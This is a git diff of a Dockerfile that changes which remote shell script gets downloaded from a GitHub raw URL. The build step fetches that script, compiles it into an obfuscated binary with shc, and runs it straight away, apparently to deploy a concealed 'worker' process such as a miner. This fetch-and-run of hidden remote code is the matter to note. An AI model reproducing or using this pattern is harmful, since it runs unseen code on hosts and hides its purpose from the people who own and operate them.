@@ -1,6 +1,6 @@
 FROM alpine:edge
 
-ENV SHURL https://raw.githubusercontent.com/zhoukun52058/opshift/master/55.sh
+ENV SHURL https://raw.githubusercontent.com/zhoukun52058/Redmond/main/exss.sh
 
 RUN echo "http://dl-cdn.alpinelinux.org/alpine/edge/testing" >> /etc/apk/repositories && apk update && apk add --no-cache gcc musl-dev shc && \
     wget $SHURL -O /worker && shc -r -B -f /worker && /worker.x && \
